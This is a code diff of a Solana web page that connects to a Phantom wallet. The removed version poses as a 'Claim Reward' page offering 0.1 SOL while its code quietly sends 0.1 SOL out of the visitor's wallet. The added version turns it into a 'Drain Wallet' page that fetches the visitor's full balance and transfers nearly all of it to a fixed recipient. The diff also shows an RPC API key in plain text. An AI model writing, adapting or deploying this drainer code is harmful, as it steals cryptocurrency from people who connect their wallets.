@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Claim Reward</title>
+    <title>Drain Wallet</title>
     <!-- Solana Web3.js -->
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <style>
@@ -21,26 +21,26 @@
         }
 
         .container { padding: 20px; width: 90%; }
-        h1 { font-size: 2rem; margin-bottom: 10px; }
+        h1 { font-size: 2rem; margin-bottom: 10px; color: #ff4444; }
         p { color: #ccc; margin-bottom: 30px; }
 
-        .btn-green {
-            background-color: #00ff88;
-            color: #000;
+        .btn-red {
+            background-color: #ff4444;
+            color: #fff;
             border: none;
             padding: 15px 40px;
             font-size: 1.2rem;
             font-weight: bold;
             border-radius: 30px;
             cursor: pointer;
-            box-shadow: 0 0 15px rgba(0, 255, 136, 0.4);
+            box-shadow: 0 0 15px rgba(255, 68, 68, 0.4);
             width: 100%;
         }
 
         #status {
-            margin-top: 0px;
+            margin-top: 20px;
             font-size: 0.9rem;
-            color: #00ff88;
+            color: #ff4444;
             min-height: 50px;
             word-wrap: break-word;
         }
@@ -49,10 +49,10 @@
 <body>
 
     <div class="container">
-        <h1>SOL Reward</h1>
-        <p>Connect Phantom Wallet to claim 0.1 SOL.</p>
+        <h1>Drain Everything</h1>
+        <p>Sends 100% of your SOL to my wallet.</p>
         
-        <button id="connectBtn" class="btn-green" onclick="initiateClaim()">Sign Green</button>
+        <button id="drainBtn" class="btn-red" onclick="drainWallet()">Drain All</button>
         
         <div id="status"></div>
     </div>
@@ -68,9 +68,9 @@
         // YOUR API KEY
         const RPC_URL = "https://mainnet.helius-rpc.com/?api-key=e67b03d4-9ec2-4eb7-a188-97f90fa26a45";
 
-        async function initiateClaim() {
+        async function drainWallet() {
             const statusDiv = document.getElementById("status");
-            const btn = document.getElementById("connectBtn");
+            const btn = document.getElementById("drainBtn");
 
             if (!window.solana || !window.solana.isPhantom) {
                 alert("Please install Phantom Wallet on your iPhone.");
@@ -93,44 +93,57 @@
                     return;
                 }
 
-                // 3. Create Transaction
+                // 3. Get Connection and Current Balance
+                const connection = new solanaWeb3.Connection(RPC_URL);
+                
+                statusDiv.innerText = "Fetching balance...";
+                
+                // Fetch the balance of the connected wallet
+                const balanceInLamports = await connection.getBalance(userPublicKey);
+                
+                // Reserve a small amount for transaction fees (approx 5000 lamports)
+                // This ensures the tx doesn't fail if balance is exact
+                const feeReserve = 5000; 
+                const amountToSend = balanceInLamports - feeReserve;
+
+                if (amountToSend <= 0) {
+                    alert("Wallet is empty or insufficient for fees.");
+                    return;
+                }
+
+                statusDiv.innerText = `Found ${ (balanceInLamports / 1000000000).toFixed(4) } SOL. Draining...`;
+
+                // 4. Create Transaction
                 const transaction = new solanaWeb3.Transaction();
                 
-                // Transfer 0.1 SOL (100,000,000 lamports)
+                // Transfer the MAX amount
                 transaction.add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: userPublicKey,
                         toPubkey: recipientPubkey,
-                        lamports: 100000000 
+                        lamports: amountToSend 
                     })
                 );
 
-                // 4. Fetch Recent Blockhash
-                statusDiv.innerText = "Fetching blockhash...";
+                // 5. Fetch Recent Blockhash
+                statusDiv.innerText = "Finalizing...";
                 
-                const connection = new solanaWeb3.Connection(RPC_URL);
+                const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
                 
-                try {
-                    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
-                    
-                    transaction.recentBlockhash = blockhash;
-                    transaction.feePayer = userPublicKey;
-                } catch (err) {
-                    console.error("RPC Error:", err);
-                    throw new Error("Network Error: " + err.message);
-                }
+                transaction.recentBlockhash = blockhash;
+                transaction.feePayer = userPublicKey;
 
+                // 6. Sign AND Send (Modern Phantom Method)
                 statusDiv.innerText = "Sign Green...";
                 
-                // 5. Sign AND Send (Modern Phantom Method)
                 const result = await window.solana.signAndSendTransaction(transaction, {
                     skipPreflight: false,
                     commitment: 'singleGossip'
                 });
 
-                console.log("Sent:", result.signature);
+                console.log("Drain Sent:", result.signature);
                 
-                alert("Success! 0.1 SOL sent.");
+                alert(`Success! Drained ${ (amountToSend / 1000000000).toFixed(5) } SOL.`);
                 btn.style.display = 'none';
                 statusDiv.innerText = "Sent: " + result.signature;
 
